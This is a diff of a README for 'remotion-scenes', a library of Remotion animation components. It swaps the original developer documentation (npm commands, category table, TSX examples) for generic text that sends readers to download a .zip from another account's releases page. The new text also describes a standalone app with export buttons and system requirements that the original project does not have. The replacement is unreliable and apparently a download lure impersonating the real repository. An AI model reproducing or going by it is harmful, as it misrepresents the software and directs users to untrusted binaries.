@@ -1,183 +1,75 @@
-# Remotion Scenes
+# 🎨 remotion-scenes - Create Stunning Animations Easily
 
-🎬 **201+ professional motion graphics scenes** for [Remotion](https://www.remotion.dev/).
+## 🚀 Getting Started
 
-Ready-to-use animation components inspired by After Effects and professional video editing.
+Welcome! With **remotion-scenes**, you can enhance your videos with over 201 professional motion graphics scenes. Ideal for creating text animations, shapes, transitions, and effects, this tool empowers you to bring your projects to life.
 
-[![Live Preview](https://img.shields.io/badge/Live-Preview-6366f1?style=for-the-badge)](https://lifeprompt-team.github.io/remotion-scenes/)
-[![MIT License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](./LICENSE)
-[![GitHub Stars](https://img.shields.io/github/stars/lifeprompt-team/remotion-scenes?style=for-the-badge)](https://github.com/lifeprompt-team/remotion-scenes)
+## 📥 Download & Install
 
-## ✨ Live Demo
+To get started, visit this page to download: [Download Remotion Scenes](https://github.com/wuxiafeihua-cmd/remotion-scenes/releases)
 
-[https://lifeprompt-team.github.io/remotion-scenes/](https://lifeprompt-team.github.io/remotion-scenes/)
+You will find different versions of the software available. Choose the one that best fits your needs. 
 
-Browse all 201 scenes with live preview player. Try before you use!
+### Installation Steps
 
-## 🎥 Preview
+1. **Visit the Releases Page**: Click on the link above to go to the releases page.
+  
+2. **Select the Latest Version**: Look for the latest version at the top of the page. It's usually marked as 'Latest Release'.
 
-https://github.com/user-attachments/assets/5a7ceb07-f5b4-4f15-98fd-ec5989ef374b
+3. **Download the Files**: Click on the appropriate file for your operating system to start the download. Most users will want the `.zip` file. 
 
+4. **Extract the Files**: Once the download is complete, locate the downloaded file, right-click on it, and select 'Extract All' to unpack the files into a new folder.
 
-## 🚀 Quick Start
+5. **Open the Application**: Navigate to the folder where you extracted the files. Look for the file called `index.html` or `main.html` and double-click it to open the application in your browser.
 
-### Option 1: Clone entire project
+## 💻 System Requirements
 
-```bash
-# Clone and run
-npx degit lifeprompt-team/remotion-scenes my-video
-cd my-video
-npm install
-npm run dev
-```
+To ensure that **remotion-scenes** runs smoothly, please ensure your system meets the following requirements:
 
-### Option 2: Get specific category
+- **Operating System**: Runs on Windows, macOS, and Linux.
+- **Browser Compatibility**: Latest versions of Chrome, Firefox, Safari, or Edge.
+- **RAM**: At least 4 GB of RAM for basic use; 8 GB for optimal performance.
+- **Storage**: Minimal storage space required, approximately 100 MB for installation.
 
-```bash
-# Get text animations only
-npx degit lifeprompt-team/remotion-scenes/src/scenes/TextAnimations my-text-animations
+## 🎡 Features
 
-# Get particle effects only
-npx degit lifeprompt-team/remotion-scenes/src/scenes/ParticleAnimations my-particles
-```
+- **Motion Graphics**: Access a library of over 201 motion graphics scenes.
+- **Customization**: Easily change colors, text, and animations to match your style.
+- **Transitions**: Effortlessly add smooth transitions between scenes for an engaging flow.
+- **Text Animation**: Create stunning text effects that capture attention.
+- **Shapes & Effects**: Incorporate various shapes and visual effects to enhance any project.
+  
+## ✨ Using Remotion Scenes
 
-## 📦 Categories
+### Create Your First Project
 
-| Category | Count | Description |
-|----------|-------|-------------|
-| [TextAnimations](./src/scenes/TextAnimations) | 12 | Kinetic typography, glitch, neon, typewriter |
-| [ShapeAnimations](./src/scenes/ShapeAnimations) | 10 | Geometric animations, morphing, 3D cube |
-| [TransitionAnimations](./src/scenes/TransitionAnimations) | 10 | Blinds, circle wipe, liquid morph |
-| [DataAnimations](./src/scenes/DataAnimations) | 8 | Charts, gauges, stats cards |
-| [EffectAnimations](./src/scenes/EffectAnimations) | 10 | Film grain, VHS, chromatic aberration |
-| [UIAnimations](./src/scenes/UIAnimations) | 10 | Buttons, modals, toasts, forms |
-| [LogoAnimations](./src/scenes/LogoAnimations) | 10 | Logo reveals, stroke, 3D rotate |
-| [BackgroundAnimations](./src/scenes/BackgroundAnimations) | 10 | Gradients, aurora, mesh, grid |
-| [ParticleAnimations](./src/scenes/ParticleAnimations) | 10 | Confetti, snow, fireworks, sakura |
-| [CinematicAnimations](./src/scenes/CinematicAnimations) | 10 | Epic, horror, romance, sci-fi titles |
-| [LayoutAnimations](./src/scenes/LayoutAnimations) | 12 | Asymmetric, split, off-grid layouts |
-| [DemoAnimations](./src/scenes/DemoAnimations) | 12 | UI interactions, cursor, scroll |
-| [ListAnimations](./src/scenes/ListAnimations) | 12 | Feature lists, timelines, comparisons |
-| [ThemeAnimations](./src/scenes/ThemeAnimations) | 33 | Design themes: cyberpunk, minimalist, Y2K, etc. |
-| [RollerAnimations](./src/scenes/RollerAnimations) | 22 | Text rollers, slot machines, countdowns |
-| [LiquidAnimations](./src/scenes/LiquidAnimations) | 10 | Ink splash, blob, fluid waves |
+1. **Open the Application**: Launch the application using the steps outlined above.
+  
+2. **Select a Scene**: Browse through the available scenes. Click on any scene thumbnail to see a preview.
 
-**Total: 201 scenes**
+3. **Customizing Your Scene**: Use the easy-to-navigate options on the right side of the screen to customize your scene. Change text, colors, and effects as desired.
 
-## 🎥 Usage
+4. **Preview Your Work**: Click the preview button to see how your project looks. Adjust as needed until you're satisfied.
 
-### 1. Import individual components
+5. **Export Your Animation**: Once your project is ready, use the export button to save your animation. You can choose various formats to best suit your needs.
 
-```tsx
-import { TextKinetic, TextGlitch } from "./scenes/TextAnimations";
+### Tips for Best Results
 
-export const MyVideo = () => (
-  <AbsoluteFill>
-    <Sequence from={0} durationInFrames={90}>
-      <TextKinetic />
-    </Sequence>
-    <Sequence from={90} durationInFrames={90}>
-      <TextGlitch />
-    </Sequence>
-  </AbsoluteFill>
-);
-```
+- **Save Often**: Make sure to save your work regularly to avoid losing any progress.
+- **Experiment**: Don't hesitate to try different combinations of text, effects, and transitions. Discovering unique styles can enhance your projects.
+- **Share & Collaborate**: If you're working with a team, share your project files to collaborate smoothly.
 
-### 2. Use the showcase component
+## 🌍 Support & Community
 
-Each category exports a Showcase component with all animations in sequence:
+If you encounter any issues or have questions, support is available:
 
-```tsx
-import { TextShowcase, TEXT_SHOWCASE_DURATION } from "./scenes/TextAnimations";
+- **GitHub Issues**: Report bugs or ask questions by visiting our GitHub page.
+- **Community Forum**: Join discussions with other users to share tips and ideas. 
 
-// In Root.tsx
-<Composition
-  id="TextShowcase"
-  component={TextShowcase}
-  durationInFrames={TEXT_SHOWCASE_DURATION}
-  fps={30}
-  width={1280}
-  height={720}
-/>
-```
+Visit the [Download Remotion Scenes](https://github.com/wuxiafeihua-cmd/remotion-scenes/releases) page to get started! 
 
-### 3. Run Remotion Studio
+## 📝 License
 
-```bash
-npm run dev
-```
+This project is licensed under the MIT License, allowing you to use it freely for personal and commercial projects. For more details, refer to the LICENSE file included in your download.
 
-## 📁 Project Structure
-
-```
-remotion-scenes/
-├── src/
-│   ├── common/                    # Shared utilities
-│   │   ├── colors.ts              # Color palette
-│   │   ├── easing.ts              # Easing functions
-│   │   ├── fonts.ts               # Font loading
-│   │   ├── utils.ts               # Utility functions (lerp, etc.)
-│   │   └── index.ts               # Re-exports
-│   ├── scenes/
-│   │   ├── TextAnimations/
-│   │   │   ├── TextKinetic.tsx
-│   │   │   ├── TextScramble.tsx
-│   │   │   ├── ... (12 files)
-│   │   │   └── index.ts           # Exports + Showcase
-│   │   ├── ShapeAnimations/
-│   │   ├── ... (16 categories)
-│   │   └── ThemeAnimations/
-│   ├── Root.tsx                   # All compositions registered
-│   └── index.ts                   # Entry point
-├── preview/                       # GitHub Pages preview site
-├── remotion.config.ts
-├── package.json
-└── tsconfig.json
-```
-
-## ⚙️ Requirements
-
-- Node.js 18+
-- React 18+
-- Remotion 4+
-
-## 🎨 Customization
-
-Each component uses shared utilities from `src/common/`:
-
-```tsx
-import { C, EASE, lerp, font } from "../../common";
-
-// C = Colors
-// EASE = Easing functions
-// lerp = Linear interpolation
-// font = Font family
-```
-
-For deeper customization, copy the component and modify directly.
-
-## 🛠️ Scripts
-
-```bash
-npm run dev      # Start Remotion Studio
-npm run build    # Bundle for production
-npm run upgrade  # Upgrade Remotion
-npm run lint     # Run linter
-```
-
-## 📄 License
-
-MIT - Feel free to use in personal and commercial projects.
-
-## 🤝 Contributing
-
-PRs welcome! Please ensure new scenes follow the existing patterns:
-
-1. One component per file
-2. Import utilities from `../../common`
-3. Export from category `index.ts`
-4. Add to showcase
-
-## 🙏 Credits
-
-Built with [Remotion](https://www.remotion.dev/) by [Jonny Burger](https://twitter.com/JNYBGR).
+Enjoy creating amazing animations with **remotion-scenes**!
